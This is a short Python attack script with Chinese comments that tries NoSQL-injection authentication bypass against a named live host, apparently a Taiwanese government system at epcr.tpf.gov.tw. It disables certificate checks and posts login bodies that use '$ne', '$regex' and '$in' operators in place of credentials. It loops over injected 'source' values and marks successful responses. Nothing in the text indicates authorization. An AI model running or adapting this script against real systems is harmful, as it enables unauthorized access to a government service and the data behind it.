import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

base={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
print("=== body 加 source 字段 (顶层注入) ===")
for src in ["PORTAL","WEB","API","SYSTEM","TPF","AUTH_SERVER","CONSOLE","ADMIN","PORT","EMERGENCY"]:
    b=dict(base); b["source"]=src
    code,t=login(b,src)
    mark=" ***" if code in (200,302) else ""
    print(f"  source={src:12s} -> {code} | {t[:60]}{mark}")
    time.sleep(0.1)
# 测试 source 用 $ne 让所有 source 通过
print("\n=== source 操作符 ===")
for sv in [{"$ne":None},{"$regex":"."},{"$in":["PORTAL","WEB","API"]},True,1,0]:
    b=dict(base); b["source"]=sv
    code,t=login(b,str(sv)[:20])
    mark=" ***" if code in (200,302) else ""
    print(f"  source={str(sv)[:22]:24s} -> {code} | {t[:55]}{mark}")
    time.sleep(0.1)
print("DONE")
